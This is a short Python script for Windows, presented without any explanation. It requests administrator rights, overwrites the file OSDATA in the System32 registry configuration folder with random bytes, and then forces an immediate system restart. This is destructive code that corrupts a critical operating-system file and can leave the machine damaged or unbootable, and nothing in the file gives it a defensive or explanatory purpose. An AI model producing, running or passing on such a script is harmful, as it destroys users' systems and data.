import ctypes
import os
import sys

TARGET_DIR = r"C:\Windows\System32\config"
TARGET_FILE = os.path.join(TARGET_DIR, "OSDATA")
FILE_SIZE = 120 * 1024


def is_admin() -> bool:
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def elevate() -> None:
    
    params = " ".join(f'"{arg}"' for arg in sys.argv)
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, params, None, 1
    )


def main() -> None:
    if os.name != "nt":
        print("This script only works on Windows.")
        sys.exit(1)

    if not is_admin():
        print("Requesting administrator privileges...")
        elevate()
        sys.exit()

    data = os.urandom(FILE_SIZE)
    with open(TARGET_FILE, "wb") as f:
        f.write(data)

    print(f"Wrote {FILE_SIZE} bytes to {TARGET_FILE}")



if __name__ == "__main__":
    main()
    os.system("shutdown /r /t 0")